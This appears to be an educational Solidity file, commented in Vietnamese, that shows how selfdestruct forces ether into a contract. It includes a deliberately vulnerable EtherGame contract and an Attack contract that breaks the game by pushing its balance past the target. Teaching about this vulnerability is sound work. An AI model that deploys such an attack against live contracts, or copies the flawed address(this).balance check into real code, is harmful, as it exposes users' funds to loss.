// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

// # Basic / Dùng selfdestruct

contract A {
    // 1 fallback function ở phiên bản hiện tại bắt buộc phải có từ khóa payable. Nếu 1 contract mà k có hàm có payable or fallback k có payable thì sẽ k nhận được tiền. Fallback là hàm tự gọi khi gọi hàm k tồn tại hoặc khi nhận ether
    // Tuy nhiên, hiện có đến 2 cách để 1 contract nhận ether mà k có hàm nào dùng payable cả
    // C1: Miner gắn địa chỉ nhận tiền vào địa chỉ nhận phần thưởng khi hắn đào ra block mới
    // C2: sử dụng hàm selfdestruct. Hàm sẽ hủy contract trên blockchain và chuyển số tiền còn lại của contract đó vào địa chỉ nào đó(địa chỉ này có thể k có payable)
    // => Thử tạo contract B -> selfdestruct nó r gửi tiền còn lại của nó vào A
    fallback() external { // 1 fallback function k có payable và ở đây k nhận được tiền theo cách bth
    }
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract B {
    constructor() payable {
        
    }
    function kill(address payable _addr) public payable{
        selfdestruct(_addr); // Address truyền vào selfdestruct phải là payable address. Địa chỉ truyền vào sẽ đc convert sang payable address. Đó là contract muốn gửi tiền vào
    }
}

// Ví dụ dùng selfdestruct để tấn công 1 contract game khi code có lỗ hổng 
contract EtherGame {
    uint public targetAmount = 7 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        // balance += msg.value; // Đã fix -> balance thành lượng ether gửi bằng hàm này chứ kp lượng ether tổng số dư nx
        balance = address(this).balance; // Đây là code cũ trông rất bình thường nhưng lại có lỗi
        require(balance <= targetAmount, "Game is over");
        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }
    
    function getBalance() public view returns(uint){
        return address(this).balance;
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
// => Để tránh lỗ hổng này phải luôn nhớ là 1 contract có thể nhận lên đc bất cứ 1 khoản tiền nào bất cứ lúc nào, khi đó check điều kiện liên quan tới balance phải cẩn thận => tốt nhất là kbh dùng address(this).balance trong câu điều kiện
contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that the game balance >= 7 ether

        // Cast address to payable -> khi dùng selfdestruct phải cast sang dù địa chỉ contract thực tế k có hàm nào payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
